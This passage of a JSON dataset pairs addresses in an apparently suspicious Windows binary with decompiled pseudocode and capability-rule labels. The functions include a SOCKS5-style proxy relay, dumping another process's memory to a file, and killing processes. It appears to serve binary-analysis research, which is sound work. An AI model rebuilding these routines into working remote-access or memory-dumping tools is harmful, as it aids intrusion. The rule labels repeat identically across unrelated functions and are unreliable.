        "decompiled_code": "\nuchar fcn.004824bc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 57
    },
    "00484b38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00484b38(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint uStack444;\n    uchar *puStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint uStack420;\n    uint uStack416;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uchar auStack116 [40];\n    uint8_t uStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    \n    uVar2 = 0;\n    uStack416 = 0;\n    uStack420 = 0x2c;\n    puStack424 = &stack0xffffffbc;\n    uStack428 = 0;\n    uStack432 = 0x484b54;\n    iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n    if (iVar1 == 0) {\n        uStack432 = 0;\n        uStack436 = 0x20;\n        puStack440 = &stack0xffffff8c;\n        puVar4 = &stack0xfffffe44;\n        uStack444 = 3;\n        iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n        if (iVar1 == 0) {\n            uVar3 = 2;\n            iVar1 = sub.ntdll.dll_NtQuerySystemInformation(2, &stack0xfffffe44, 0x138, 0);\n            if (iVar1 == 0) {\n                if (*0x4a4a58 != NULL || *0x4a4a54 != 0) {\n                    iStack72 = uVar3 - *0x4a4a54;\n                    puStack68 = puVar4 + (-(uVar3 < *0x4a4a54) - *0x4a4a58);\n                    iStack64 = uStack140 - *0x4a4a5c;\n                    iStack60 = (iStack136 - *0x4a4a60) - (uStack140 < *0x4a4a5c);\n                    uStack56 = uStack76;\n                    *0x4a4a64 = fcn.0040344c();\n                    if (*0x4a4a58 != NULL || *0x4a4a64 != *0x4a4a54) {\n                        uVar2 = *0x4a4a64;\n                    }\n                }\n                *0x4a4a58 = puVar4;\n                *0x4a4a54 = uVar3;\n                *0x4a4a5c = uStack140;\n                *0x4a4a60 = iStack136;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 650
    },
    "0048521c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048521c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    if (*(in_EAX + 0xc) == '\\0') {\n        uStack16 = *(in_EAX + 0x3e);\n        uStack20 = *(*(in_EAX + 0x11) * 4 + 0x4a4ac8);\n        uStack24 = *(*(in_EAX + 0xf) * 4 + 0x4a4a68);\n        sub.wsock32.dll_socket();\n        iVar1 = (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = iVar1;\n        *(in_EAX + 0xc) = iVar1 != -1;\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x31) == '\\x01') {\n                uStack24 = 1;\n                sub.wsock32.dll_ioctlsocket(in_EAX[0x10], 0x8004667e, &uStack24);\n                (**(*in_EAX + 0x38))();\n            }\n            in_EAX[0xd] = 0;\n            in_EAX[0xe] = 0;\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "004852a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004852a0(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0xc) != '\\0') {\n        sub.wsock32.dll_closesocket(in_EAX[0x10]);\n        (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = -1;\n        *(in_EAX + 0xc) = 0;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0048684c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0048684c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x486aeb;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048684c::var_20h;\n    if (*0x4a4ae0 != '\\x01') {\n        var_28h = 0x486a9f;\n        var_2ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0048684c::var_2ch;\n        var_18h = &stack0xfffffffc;\n        var_14h = unaff_EDI;\n        var_10h = unaff_ESI;\n        fcn.0040546c();\n        *0x4a4ae0 = 1;\n        *0x4a4adc = '\\0';\n        fcn.0047ffe8();\n        fcn.0040ee40(&fcn.0048684c::var_24h, *0x486afc);\n        fcn.00405504();\n        fcn.00409a78();\n        fcn.00405504();\n        piVar1 = fcn.00404610();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            (**(*piVar1 + 0x48))();\n            fcn.00405a48(&fcn.0048684c::var_10h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48(&fcn.0048684c::var_14h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48(&fcn.0048684c::var_18h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            iVar2 = 0;\n            do {\n                uVar9 = 0x486b1c;\n                uVar7 = 0x486b1c;\n                uVar5 = 0x486b1c;\n                uVar4 = 0;\n                iVar3 = iVar2;\n                puVar6 = var_18h;\n                uVar8 = var_14h;\n                uVar10 = var_10h;\n                fcn.00409d58(iVar2);\n                fcn.00405800(var_2ch, iVar3, uVar4, uVar5, puVar6, uVar7, uVar8, uVar9, uVar10);\n                sub.kernel32.dll_CreateThread(0, 0, fcn.004866f4, &fcn.0048684c::var_4h, 0, &fcn.0048684c::var_20h);\n                sub.kernel32.dll_Sleep_1();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0x100);\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n        uVar8 = 0x486b28;\n        fcn.00405800(0x486b28, var_18h, 0x486b1c, var_14h, 0x486b1c, var_10h);\n        while (*0x4a4adc == '\\0') {\n            uVar8 = 100;\n            sub.kernel32.dll_Sleep_1();\n        }\n        fcn.00405784();\n        fcn.004938a4();\n        *in_FS_OFFSET = uVar8;\n        *in_FS_OFFSET = var_14h;\n        fcn.00405490(0x486af2);\n        fcn.00405490();\n        return;\n    }\n    var_24h = NULL;\n    // WARNING: Subroutine does not return\n    var_28h = 0x486ac3;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1198
    },
    "00486be8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00486be8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x486c51;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (*0x4ab26c == 0) {\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        fcn.0047eb04();\n        fcn.00404640();\n        fcn.0047f218();\n        fcn.00404640();\n        *0x4ab270 = 0;\n        *0x4ab26c = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00486ed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00486ed8 noreturn (void)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint *puStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_2eh;\n    uint var_12h;\n    int32_t iStack18;\n    int32_t iStack14;\n    int16_t iStack10;\n    ushort uStack8;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x4870d5;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack76;\n    puVar2 = &stack0xfffffffc;\n    if (*0x4ab274 != 0) {\n        fcn.00404640();\n        *0x4ab274 = 0;\n        puVar2 = puStack68;\n    }\n    puStack68 = puVar2;\n    *0x4ab274 = fcn.00404610();\n    fcn.00486be8();\n    fcn.00486c68();\n    iStack18 = fcn.00409dd8();\n    var_12h._2_2_ = fcn.00409dd8();\n    uStack8 = fcn.00409dd8();\n    iStack14 = var_12h._2_2_ * iStack18 * 2;\n    iVar1 = var_12h._2_2_ * 2;\n    iStack10 = iVar1;\n    if (*0x4ab26c == 0) {\n        *0x4ab26c = fcn.0047e8b0();\n    }\n    if (*0x4ab270 == 0) {\n        *0x4ab270 = fcn.0047efa0();\n    }\n    iVar3 = *0x4ab270;\n    *(*0x4ab270 + 0xa4) = *0x4ab274;\n    *(iVar3 + 0xa0) = fcn.00486de0;\n    *(*0x4ab26c + 0x15e) = var_12h._2_2_;\n    *(*0x4ab26c + 0x160) = iStack18;\n    *(*0x4ab26c + 0x164) = iStack14;\n    *(*0x4ab26c + 0x168) = iVar1;\n    *(*0x4ab26c + 0x16a) = uStack8;\n    fcn.0047eb20();\n    fcn.0047f270();\n    fcn.0047eb04();\n    fcn.0047f138();\n    do {\n        while( true ) {\n            puStack76 = &var_2eh;\n            iVar3 = sub.user32.dll_PeekMessageA();\n            if (iVar3 == 0) break;\n            sub.user32.dll_TranslateMessage(&var_2eh);\n            puStack76 = &var_2eh;\n            sub.user32.dll_DispatchMessageA();\n        }\n    } while (**0x4a4de0 != '\\0');\n    fcn.0047eb04();\n    fcn.0047f218();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    *0x4ab270 = 0;\n    *0x4ab26c = 0;\n    *0x4ab274 = 0;\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 801
    },
    "00487320": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487320 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack44 = 0x48733f;\n    fcn.00405f08();\n    uStack48 = 0x48741a;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x4873e5;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    iVar1 = *(arg_8h + 4);\n    if (iVar1 <= *(arg_8h + 8)) {\n        iVar2 = (*(arg_8h + 8) - iVar1) + 1;\n        var_14h = iVar1;\n        do {\n            if (**0x4a4e70 == '\\0') {\n    // WARNING: Subroutine does not return\n                sub.kernel32.dll_ExitThread(0);\n            }\n            iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n            fcn.004054c0();\n            *(iVar1 + 4) = var_14h;\n            sub.kernel32.dll_CreateThread(0, 0, fcn.00487174, iVar1, 0, &fcn.00487320::var_18h);\n            uStack64 = 100;\n            sub.kernel32.dll_Sleep_1();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 508
    },
    "00489170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00489170(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uVar4;\n    uint uStack5840;\n    uint uStack5836;\n    uchar *puStack5832;\n    uint var_16b4h;\n    uint *var_16b0h;\n    int32_t iStack5808;\n    uint uStack5804;\n    uint var_16a4h;\n    uint *puStack5796;\n    uint uStack5792;\n    uint uStack5788;\n    uint var_15a0h;\n    uint var_159ch;\n    uint var_158eh;\n    uint var_58eh;\n    uint var_399h;\n    uint var_140h;\n    uint8_t var_13ch;\n    uint var_138h;\n    uint var_132h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack5832 = 0x48919c;\n    fcn.00405f08();\n    uStack5836 = 0x48966e;\n    uStack5840 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe930;\n    puStack5832 = &stack0xfffffffc;\n    fcn.00408460();\n    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00489170::var_132h, 2, 2);\n    if (((iVar2 < 1) || (var_132h != '\\x05')) ||\n       (sub.wsock32.dll_recv(var_10h, &fcn.00489170::var_132h, var_132h._1_1_ + 2, 0),  var_132h._1_1_ - 1 < 0))\n    goto code_r0x00489639;\n    var_24h = 0;\n    if (var_132h._2_1_ == '\\x02') {\n        if ((var_18h == 0) && (var_14h == 0)) {\n            var_132h._1_1_ = 0;\n            sub.wsock32.dll_send(var_10h, &fcn.00489170::var_132h, 2, 0);\n        }\n        else {\n            var_132h._1_1_ = 2;\n            sub.wsock32.dll_send(var_10h, &fcn.00489170::var_132h, 2, 0);\n            sub.wsock32.dll_recv(var_10h, &fcn.00489170::var_399h, 0x259, 0);\n            if (var_399h == '\\x01') {\n                fcn.0040555c();\n                uVar3 = var_399h._1_1_ == 0xfffffffe;\n                fcn.0040555c();\n                fcn.00405894();\n                if ((!uVar3) || (fcn.00405894(),  !uVar3)) {\n                    var_399h._1_1_ = 0xff;\n                    sub.wsock32.dll_send(var_10h, &fcn.00489170::var_399h, 2, 0);\n                    goto code_r0x00489639;\n                }\n                var_399h._1_1_ = 0;\n                sub.wsock32.dll_send(var_10h, &fcn.00489170::var_399h, 2, 0);\n            }\n        }\n    }\n    else if (var_132h._2_1_ == '\\0') {\n        if ((var_14h != 0) || (var_18h != 0)) {\n            var_132h._1_1_ = 0xff;\n            sub.wsock32.dll_send(var_10h, &fcn.00489170::var_132h, 2, 0);\n            goto code_r0x00489639;\n        }\n        var_132h._1_1_ = 0;\n        sub.wsock32.dll_send(var_10h, &fcn.00489170::var_132h, 2, 0);\n    }\n    else if (var_132h._1_1_ == 0) {\n        var_132h._1_1_ = 0xff;\n        sub.wsock32.dll_send(var_10h, &fcn.00489170::var_132h, 2, 0);\n        goto code_r0x00489639;\n    }\n    uStack5788 = 2;\n    uStack5792 = 0xc;\n    puStack5796 = &fcn.00489170::var_140h;\n    uStack5804 = 0x48939e;\n    sub.wsock32.dll_recv();\n    if (var_140h._1_1_ == '\\x01') {\n        uStack5804 = 0x4893bd;\n        fcn.00403ae4();\n        if (var_140h._3_1_ == '\\x01') {\n            uStack5804 = 0;\n            iStack5808 = 0xc;\n            var_16b0h = &fcn.00489170::var_140h;\n            sub.wsock32.dll_recv();\n            var_15a0h._2_2_ = var_138h;\n            fcn.00408460();\n        }\n        else if (var_140h._3_1_ == '\\x03') {\n            uStack5804 = 0x48941c;\n            fcn.00403ae4();\n            uStack5804 = 0;\n            iStack5808 = var_13ch + 7;\n            var_16b0h = &fcn.00489170::var_58eh;\n            var_16b4h = var_10h;\n            sub.wsock32.dll_recv();\n            fcn.0040555c();\n            fcn.004058fc();\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            var_159ch = ***(iVar2 + 0xc);\n            var_15a0h._2_2_ = sub.wsock32.dll_htons();\n        }\n        var_15a0h._0_2_ = 2;\n        puStack5832 = 0x1;\n        uStack5836 = 2;\n        uStack5840 = 0x4894a1;\n        unaff_ESI = sub.wsock32.dll_socket();\n        uStack5840 = 0x10;\n        iVar2 = sub.wsock32.dll_connect(unaff_ESI, &fcn.00489170::var_15a0h);\n        var_140h._1_1_ = iVar2 != 0;\n        var_140h._0_1_ = 5;\n        var_140h._2_1_ = 0;\n        var_140h._3_1_ = '\\x01';\n        fcn.00403ae4();\n        var_30h = 0x10;\n        sub.wsock32.dll_getsockname(unaff_ESI, &fcn.00489170::var_16b4h, &fcn.00489170::var_30h);\n        fcn.00408460();\n        var_138h._0_2_ = var_16b4h._2_2_;\n        sub.wsock32.dll_send(var_10h, &fcn.00489170::var_140h, 10, 0);\n        var_2ch = 5;\n        do {\n            fcn.004304d8();\n            fcn.004304c8();\n            fcn.004304c8();\n            uVar4 = 0;\n            iVar2 = sub.wsock32.dll_select();\n            if (iVar2 != -1) {\n                cVar1 = fcn.004304b0();\n                if (cVar1 != '\\0') {\n                    fcn.00403ae4();\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 == -1) break;\n                    uVar4 = var_10h;\n                    sub.wsock32.dll_send();\n                }\n                cVar1 = fcn.004304b0(uVar4);\n                if (cVar1 != '\\0') {\n                    fcn.00403ae4();\n                    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00489170::var_158eh, 0x1000, 0);\n                    if (iVar2 == -1) break;\n                    sub.wsock32.dll_send(unaff_ESI, &fcn.00489170::var_158eh, iVar2, 0);\n                }\n            }\n            sub.kernel32.dll_Sleep_1(0x96);\n        } while( true );\n    }\ncode_r0x00489639:\n    sub.wsock32.dll_closesocket(var_10h);\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = unaff_ESI;\n    fcn.00405fd8(0x489675);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2098
    },
    "0048a56c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048a56c noreturn (uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint uVar7;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    puStack84 = 0x48a594;\n    fcn.00405f08();\n    uStack88 = 0x48a7be;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    var_20h = 0;\n    var_28h = 0;\n    var_2ch = 0;\n    uStack96 = 0x48a5c0;\n    puStack84 = &stack0xfffffffc;\n    fcn.00403ae4();\n    var_30h = 0;\n    uStack96 = 0x48a5cd;\n    fcn.0040546c();\n    uStack96 = 0x48a5dc;\n    fcn.00408460();\n    arg_8h_00 = *arg_8h;\n    uVar4 = arg_8h[1];\n    uVar1 = arg_8h[2];\n    uVar2 = arg_8h[3];\n    uStack96 = 0x48a5f8;\n    fcn.00405504();\n    if (uVar1 == uVar4) {\n        uStack96 = 0x48a60b;\n        fcn.004938a4();\n        uStack96 = 0;\n    // WARNING: Subroutine does not return\n        uStack100 = 0x48a612;\n        sub.kernel32.dll_ExitThread();\n    }\n    uStack100 = 0;\n    uStack104 = 0x10;\n    puStack108 = 0x48a61f;\n    uStack96 = arg_8h_00;\n    var_24h = sub.kernel32.dll_OpenProcess();\n    if (var_24h != 0) {\n        uStack112 = 0x48a778;\n        iStack116 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff8c;\n        puStack108 = &stack0xfffffffc;\n        iVar3 = fcn.004058fc(0x40000000, 0, 0, 4, 0, 0);\n        var_20h = sub.kernel32.dll_CreateFileA_1();\n        if (var_20h != -1) {\n            fcn.00406858(uVar2);\n            for (; uVar4 < uVar1; uVar4 = uVar4 + uVar5) {\n                uVar5 = uVar2;\n                if (uVar1 - uVar4 < uVar2) {\n                    uVar5 = uVar1 - uVar4;\n                }\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, 4, &fcn.0048a56c::var_30h);\n                sub.kernel32.dll_ReadProcessMemory(var_24h, uVar4, var_4h, uVar5, &fcn.0048a56c::var_28h);\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, var_30h, &fcn.0048a56c::var_30h);\n                iVar3 = var_20h;\n                sub.kernel32.dll_WriteFile_1();\n            }\n            *in_FS_OFFSET = iVar3;\n            fcn.00406864(0x48a77f);\n            sub.kernel32.dll_SetEndOfFile_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_24h);\n            uVar7 = 0x48a868;\n            uVar6 = 0;\n            fcn.00409d58(arg_8h_00);\n            fcn.00405800(0x48a8a8, var_8h, 0x48a888, 0, arg_8h_00, uVar6, uVar7);\n            fcn.004938a4();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        fcn.004938a4();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    puStack108 = 0x48a632;\n    fcn.004938a4();\n    puStack108 = NULL;\n    // WARNING: Subroutine does not return\n    uStack112 = 0x48a639;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1239
    },
    "0048a93c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048a93c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    int32_t iStackY176;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x48aad9;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_5h = 0;\n    iVar1 = sub.kernel32.dll_OpenProcess(0x400, 0);\n    if (iVar1 != 0) {\n        iVar2 = sub.advapi32.dll_OpenProcessToken(iVar1, 8, &TokenHandle);\n        if (iVar2 != 0) {\n            uVar3 = TokenHandle;\n            iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 1, 0, 0, &TokenInformationLength);\n            TokenInformation = NULL;\n            while (bVar4 = iVar2 == 0,  bVar4) {\n                iVar2 = sub.kernel32.dll_GetLastError_1();\n                if (iVar2 != 0x7a) break;\n                fcn.00402f24();\n                uVar3 = TokenHandle;\n                iVar2 = sub.advapi32.dll_GetTokenInformation();\n            }\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, uVar3);\n            if (bVar4) goto code_r0x0048aabe;\n            var_1ch = 0;\n            var_20h = 0;\n            sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, 0, &var_1ch, 0, &var_20h, &var_18h);\n            if ((var_1ch != 0) && (var_20h != 0)) {\n                fcn.00405b8c();\n                fcn.00405b8c();\n                uVar3 = fcn.004058fc(&var_20h, &var_18h);\n                uVar3 = fcn.004058fc(&var_1ch, uVar3);\n                iVar2 = sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, uVar3);\n                if (iVar2 != 0) {\n                    var_5h = 1;\n                    fcn.004058fc();\n                    fcn.0040a9a4();\n                    fcn.004054c0();\n                    fcn.004058fc();\n                    fcn.0040a9a4();\n                    fcn.004054c0();\n                }\n            }\n            if (!bVar4) {\n                fcn.00402f0c();\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY176 = iVar1;\n    }\ncode_r0x0048aabe:\n    *in_FS_OFFSET = iStackY176;\n    fcn.00405490(0x48aae0);\n    return;\n}\n",
        "token_count": 751
    },
    "0048abec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048abec(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t hProcess;\n    uint lpExitCode;\n    \n    uStack20 = 0;\n    uStack24 = 1;\n    puStack28 = 0x48abfc;\n    hProcess = sub.kernel32.dll_OpenProcess();\n    if (hProcess != 0) {\n        uStack32 = 0x48ac44;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_GetExitCodeProcess(hProcess, &fcn.0048abec::lpExitCode);\n        iVar1 = hProcess;\n        sub.kernel32.dll_TerminateProcess(hProcess, lpExitCode);\n        *in_FS_OFFSET = iVar1;\n        sub.kernel32.dll_CloseHandle_1(hProcess, 0x48ac4b);\n        return;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0048ac50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
